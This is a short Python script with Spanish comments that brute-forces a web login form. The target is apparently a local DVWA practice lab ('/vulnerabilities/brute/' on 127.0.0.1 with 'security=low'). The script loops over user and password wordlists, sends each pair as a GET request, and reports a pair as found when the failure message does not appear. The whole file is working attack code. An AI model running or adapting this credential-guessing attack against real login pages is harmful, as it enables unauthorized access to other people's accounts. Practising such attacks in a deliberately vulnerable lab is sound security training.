import requests

# URL del formulario de login
url = "http://127.0.0.1:4280/vulnerabilities/brute/"

# Encabezados HTTP que se utilizarán en la solicitud
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
    "Referer": url,
    "Cookie": "security=low; PHPSESSID=48722bd7b92c5ebd2c00564ff3e67eb5"
}

# Función para realizar el ataque de fuerza bruta
def brute_force_attack(users_file, passwords_file):
    with open(users_file, "r") as users, open(passwords_file, "r") as passwords:
        user_list = users.readlines()
        pass_list = passwords.readlines()

        for username in user_list:
            username = username.strip()
            for password in pass_list:
                password = password.strip()

                # Datos del formulario
                data = {
                    "username": username,
                    "password": password,
                    "Login": "Login"
                }

                # Realiza la solicitud GET
                response = requests.get(url, headers=headers, params=data)

                # Verifica si la respuesta contiene un mensaje de fallo
                if "Username and/or password incorrect." not in response.text:
                    print(f"¡Combinación encontrada! Usuario: {username}, Contraseña: {password}")
                    continue  # Continúa probando el resto de combinaciones
                else:
                    print(f"Intento fallido: Usuario: {username}, Contraseña: {password}")


# Ruta a los archivos de usuarios y contraseñas
users_file = "/home/jabit0g23/users.txt"
passwords_file = "/home/jabit0g23/passwords.txt"

# Ejecuta el ataque
brute_force_attack(users_file, passwords_file)
